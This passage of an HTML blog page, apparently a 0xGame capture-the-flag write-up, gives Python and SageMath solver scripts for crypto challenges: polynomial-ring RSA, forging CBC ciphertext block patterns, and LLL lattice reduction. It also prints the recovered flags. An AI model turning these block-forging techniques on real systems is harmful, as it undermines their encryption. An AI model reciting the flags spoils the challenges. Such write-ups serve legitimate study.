解密</span></span><br><span class=\"line\">m_poly = c_poly^d</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取系数</span></span><br><span class=\"line\">m_coeffs = [Integer(m_poly[i]) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密后的系数:&quot;</span>, m_coeffs)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查系数是否在字节范围内</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, coeff <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(m_coeffs):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;系数 <span class=\"subst\">&#123;i&#125;</span>: <span class=\"subst\">&#123;coeff&#125;</span> (在 0-255 内: <span class=\"subst\">&#123;<span class=\"number\">0</span> &lt;= coeff &lt;= <span class=\"number\">255</span>&#125;</span>)&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果在字节范围内，转为字符</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">all</span>(<span class=\"number\">0</span> &lt;= coeff &lt;= <span class=\"number\">255</span> <span class=\"keyword\">for</span> coeff <span class=\"keyword\">in</span> m_coeffs):</span><br><span class=\"line\">    flag = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">chr</span>(b) <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> m_coeffs)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Flag:&quot;</span>, flag)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密失败：系数不在 ASCII 范围内&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;尝试用 long_to_bytes 方式:&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        flag_bytes = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> coeff <span class=\"keyword\">in</span> m_coeffs:</span><br><span class=\"line\">            <span class=\"comment\"># 将大整数转为字节</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> coeff &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                flag_bytes = <span class=\"built_in\">bytes</span>([coeff % <span class=\"number\">256</span>]) + flag_bytes</span><br><span class=\"line\">                coeff //= <span class=\"number\">256</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Flag bytes:&quot;</span>, flag_bytes)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;错误:&quot;</span>, e)</span><br></pre></td></tr></table></figure>\n\n<p>得到<code>0xGame&#123;D0_y0u_l1k3_RSA_w1th_p0lyn0m14l_r1ngs?&#125;</code></p>\n<h2 id=\"CCB\"><a href=\"#CCB\" class=\"headerlink\" title=\"CCB\"></a>CCB</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64decode, b64encode</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Given IV</span></span><br><span class=\"line\">IV = b64decode(<span class=\"string\">&quot;Mkoz9OBLUA4EgWqbuheBcg==&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;IV: <span class=\"subst\">&#123;IV.<span class=\"built_in\">hex</span>()&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Step 1: Create C-B-C pattern</span></span><br><span class=\"line\"><span class=\"comment\"># We need C1 = C3 != C2</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># For CBC mode:</span></span><br><span class=\"line\"><span class=\"comment\"># C1 = E(P1 ⊕ IV)</span></span><br><span class=\"line\"><span class=\"comment\"># C2 = E(P2 ⊕ C1)</span></span><br><span class=\"line\"><span class=\"comment\"># C3 = E(P3 ⊕ C2)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Strategy: </span></span><br><span class=\"line\"><span class=\"comment\"># 1. Choose P1 and P2 arbitrarily</span></span><br><span class=\"line\"><span class=\"comment\"># 2. Encrypt to get C1, C2</span></span><br><span class=\"line\"><span class=\"comment\"># 3. Set P3 = P1 ⊕ IV ⊕ C2 so that P3 ⊕ C2 = P1 ⊕ IV</span></span><br><span class=\"line\"><span class=\"comment\">#    This makes C3 = E(P3 ⊕ C2) = E(P1 ⊕ IV) = C1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Step 1: Creating C-B-C ciphertext ===&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Strategy: Choose P1, P2, then set P3 = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;This will make C3 = C1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># For the first encryption, we can choose any P1 and P2</span></span><br><span class=\"line\"><span class=\"comment\"># But we need to know C1 and C2 to compute P3</span></span><br><span class=\"line\"><span class=\"comment\"># So we&#x27;ll need to do this interactively</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nFirst, encrypt with P1=00...00 (16 zeros), P2=01...01, P3=00...00 (temporary)&quot;</span>)</span><br><span class=\"line\">P1 = <span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">P2 = <span class=\"string\">b&#x27;\\x01&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">P3_temp = <span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">plaintext1_temp = P1 + P2 + P3_temp</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Temporary plaintext (base64): <span class=\"subst\">&#123;b64encode(plaintext1_temp).decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;After getting C1 and C2 from server, calculate:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;P3 = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Then encrypt again with the corrected plaintext&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Step 2: Creating C-C-B ciphertext ===&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;After getting C and B from step 1:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;We need C1 = C2 = C and C3 = B&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nStrategy:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;1. Set P1 such that E(P1 ⊕ IV) = C&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;   So P1 = D(C) ⊕ IV - but we can&#x27;t decrypt without the key&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nAlternative strategy:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Since C1 from step 1 satisfies C1 = E(P1 ⊕ IV),&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;We need to reuse that same P1&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;For C2 = C1, we need E(P2 ⊕ C1) = C1&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;So P2 ⊕ C1 = P1 ⊕ IV&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Therefore P2 = P1 ⊕ IV ⊕ C1&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nFor C3 = B (which is C2 from step 1):&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;We need E(P3 ⊕ C2) = B&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Since C2 = C1 (both equal to C), P3 ⊕ C1 = P2_old ⊕ C1_old&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;From step 1, C2_old = E(P2_old ⊕ C1_old) = B&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;So we need P3 ⊕ C = P2_old ⊕ C (where C = C1_old)&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Therefore P3 = P2_old&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Practical Solution ===&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;1. Get IV from server&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;2. Encrypt P1||P2||temp with P1=zeros, P2=ones to get C1||C2||C3_temp&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;3. Calculate P3 = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;4. Encrypt P1||P2||P3 to get C||B||C (C-B-C pattern)&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;5. Calculate P2&#x27; = P1 ⊕ IV ⊕ C&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;6. Encrypt P1||P2&#x27;||P2 to get C||C||B (C-C-B pattern)&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;7. Get flag!&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Helper function to XOR bytes</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor_bytes</span>(<span class=\"params\">a, b</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">bytes</span>(x ^ y <span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(a, b))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n=== Interactive Solver ===&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Step 1: Use option 1 to encrypt this plaintext:&quot;</span>)</span><br><span class=\"line\">P1 = <span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">P2 = <span class=\"string\">b&#x27;\\xff&#x27;</span> * <span class=\"number\">16</span>  <span class=\"comment\"># Changed to all 0xFF to ensure P2 != P1</span></span><br><span class=\"line\">P3_temp = <span class=\"string\">b&#x27;\\x00&#x27;</span> * <span class=\"number\">16</span></span><br><span class=\"line\">plaintext_temp = P1 + P2 + P3_temp</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;b64encode(plaintext_temp).decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nAfter you get the ciphertext, paste it here (base64):&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;(Or type &#x27;manual&#x27; to calculate manually)&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    ct1 = <span class=\"built_in\">input</span>().strip()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ct1.lower() != <span class=\"string\">&#x27;manual&#x27;</span> <span class=\"keyword\">and</span> ct1:</span><br><span class=\"line\">        ct1_bytes = b64decode(ct1)</span><br><span class=\"line\">        C1 = ct1_bytes[:<span class=\"number\">16</span>]</span><br><span class=\"line\">        C2 = ct1_bytes[<span class=\"number\">16</span>:<span class=\"number\">32</span>]</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\nC1: <span class=\"subst\">&#123;C1.<span class=\"built_in\">hex</span>()&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;C2 (this is B): <span class=\"subst\">&#123;C2.<span class=\"built_in\">hex</span>()&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Calculate correct P3 for C-B-C</span></span><br><span class=\"line\">        P3 = xor_bytes(xor_bytes(P1, IV), C2)</span><br><span class=\"line\">        plaintext_cbc = P1 + P2 + P3</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n=== C-B-C Plaintext (base64) ===&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(b64encode(plaintext_cbc).decode())</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Calculate P2&#x27; for C-C-B</span></span><br><span class=\"line\">        P2_prime = xor_bytes(xor_bytes(P1, IV), C1)</span><br><span class=\"line\">        plaintext_ccb = P1 + P2_prime + P2</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n=== C-C-B Plaintext (base64) ===&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(b64encode(plaintext_ccb).decode())</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nUse these plaintexts in order when prompted for option 2!&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nManual calculation formulas:&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Given C1||C2||C3 from temporary encryption:&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;P3_correct = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;P2&#x27; = P1 ⊕ IV ⊕ C1&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nC-B-C plaintext: P1 || P2 || P3_correct&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;C-C-B plaintext: P1 || P2&#x27; || P2&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\nUse the formulas above to calculate manually&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>运行上述脚本，它会告诉你应该怎么做，首先选项1把<code>AAAAAAAAAAAAAAAAAAAAAP////////////////////8AAAAAAAAAAAAAAAAAAAAA==</code>这个粘进去，注意是base64编码的，所以记得结尾要有<code>==</code>,没有记得补上。然后服务器会返回给你加密的内容，粘进脚本里，<code>Ug7WsyG0J3FNWii4QRq2HQBI5mgU27sArYBi5lVTcR06+3+4x5Tdy5Ec9yMH2Xva</code>,然后它会给你解出cbc：<code>AAAAAAAAAAAAAAAAAAAAAP////////////////////8yAtWc9JDrDqkBCH3vRPBv</code>和ccb：<code>AAAAAAAAAAAAAAAAAAAAAGBE5UfB/3d/SdtCI/sNN2//////////////////////</code>,从而得到flag：<code> 0xGame&#123;fdc902c6-873a-4d92-b366-b6e83bde39f7&#125;</code>.</p>\n<h2 id=\"格\"><a href=\"#格\" class=\"headerlink\" title=\"格\"></a>格</h2><p>解格：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># SageMath 代码 (最终版)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 这是你从程序输出中提供的矩阵</span></span><br><span class=\"line\">matrix_data = [</span><br><span class=\"line\">    [<span class=\"number\">3284681750909390818306909313921642175535822995982583393933696966300433498618099</span>, <span class=\"number\">7062920994008607414635543198964747262695143293079919687270285360471612225464116</span>, <span class=\"number\">9826330432780730699882966183005563282601785988437488502794820428794464309726364</span>, <span class=\"number\">10313939243981504072492843197821189873801981624046806578030558315476228320733359</span>],</span><br><span class=\"line\">    [<span class=\"number\">14962120076283198553291772690327243603574931151327631953834236409697046371251172</span>, <span class=\"number\">10914614871335511269514555072571377171094477247162595307427654861209446389077850</span>, <span class=\"number\">13813513556033584840229315973248340868169094377335326963200609716900171410846991</span>, <span class=\"number\">17767016205042422794681474520318417767408504251129953471000646286235093083687535</span>],</span><br><span class=\"line\">    [<span class=\"number\">15880849953718488589631767682500857705255547835146769369286551172642086223544654</span>, <span class=\"number\">23536981063518946472925309088916542857554725764823718161707669971432320275459487</span>, <span class=\"number\">26927812823530065718296292087211430992875944789365872721297497760084580766210537</span>, <span class=\"number\">22230074134750723773334677934743831896859185125095203873930495218095676602198247</span>],</span><br><span class=\"line\">    [<span class=\"number\">14741023566046737527403024490343979553759831564949552088348125025359384680249250</span>, <span class=\"number\">8837391869363988214859613817767621920507231139048698235441315423135328237787325</span>, <span class=\"number\">9720795972355554118334542488724936259246227879278497862252939659284272861952841</span>, <span class=\"number\">12075839868445672238363457714940958060191660916729079502656993881392627251511248</span>]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">M = matrix(ZZ, matrix_data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 应用 LLL 算法. &#x27;B&#x27; 将是一个完整的 4x4 矩阵.</span></span><br><span class=\"line\">B = M.LLL()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] LLL 规约后的基 (完整的 B 矩阵):&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(B)</span><br><span class=\"line\"></span><br><span class=\"line\">found_secret = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recover_secret</span>(<span class=\"params\">vector, vector_name</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> found_secret</span><br><span class=\"line\">    <span class=\"keyword\">if</span> found_secret: <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n--- 正在检查向量: <span class=\"subst\">&#123;vector_name&#125;</span> ---&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> direction <span class=\"keyword\">in</span> [<span class=\"number\">1</span>, -<span class=\"number\">1</span>]:</span><br><span class=\"line\">        v_cand = vector * direction</span><br><span class=\"line\">        <span class=\"keyword\">if</span> v_cand.is_zero(): <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        first_nonzero_val = <span class=\"built_in\">next</span>((val <span class=\"keyword\">for</span> val <span class=\"keyword\">in</span> v_cand <span class=\"keyword\">if</span> val != <span class=\"number\">0</span>), <span class=\"literal\">None</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> byte_val <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">256</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> first_nonzero_val % byte_val == <span class=\"number\">0</span>:</span><br><span class=\"line\">                k = first_nonzero_val // byte_val</span><br><span class=\"line\">                <span class=\"keyword\">if</span> k == <span class=\"number\">0</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\">                s_cand = v_cand / k</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">all</span>(c.is_integer() <span class=\"keyword\">and</span> <span class=\"number\">0</span> &lt;= c &lt;= <span class=\"number\">255</span> <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s_cand):</span><br><span class=\"line\">                    secret_bytes = <span class=\"built_in\">bytes</span>([<span class=\"built_in\">int</span>(c) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s_cand])</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 成功! 在 &#x27;<span class=\"subst\">&#123;vector_name&#125;</span>&#x27; 中找到可能的 secret&quot;</span>)</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] secret: <span class=\"subst\">&#123;secret_bytes.<span class=\"built_in\">hex</span>()&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    found_secret = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 检查基向量及其简单组合</span></span><br><span class=\"line\">candidates = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;B[0]&quot;</span>: B[<span class=\"number\">0</span>], <span class=\"string\">&quot;B[1]&quot;</span>: B[<span class=\"number\">1</span>],</span><br><span class=\"line\">    <span class=\"string\">&quot;B[0] + B[1]&quot;</span>: B[<span class=\"number\">0</span>] + B[<span class=\"number\">1</span>], <span class=\"string\">&quot;B[0] - B[1]&quot;</span>: B[<span class=\"number\">0</span>] - B[<span class=\"number\">1</span>],</span><br><span class=\"line\">    <span class=\"string\">&quot;B[2]&quot;</span>: B[<span class=\"number\">2</span>], <span class=\"string\">&quot;B[3]&quot;</span>: B[<span class=\"number\">3</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> name, vec <span class=\"keyword\">in</span> candidates.items():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> found_secret: <span class=\"keyword\">break</span></span><br><span class=\"line\">    recover_secret(vec, name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> found_secret:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[!] 未能恢复 secret. 问题可能比预想的更复杂.&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>解密flag：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span 